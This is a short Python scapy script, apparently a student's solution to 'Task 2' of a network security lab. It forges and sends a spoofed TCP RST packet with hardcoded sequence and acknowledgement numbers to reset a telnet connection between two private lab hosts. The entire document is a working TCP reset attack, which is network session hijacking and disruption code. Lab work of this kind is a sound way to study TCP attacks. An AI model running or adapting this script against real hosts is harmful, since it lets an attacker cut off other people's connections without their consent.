#!/usr/bin/python3

from scapy.all import *

#Task 2

ip = IP(src = "10.0.2.5", dst = "10.0.2.6")
tcp = TCP(sport = 58072, dport = 23, flags = "R", seq = 1704702506, ack = 2753975546)

pkt = ip/tcp
send(pkt)
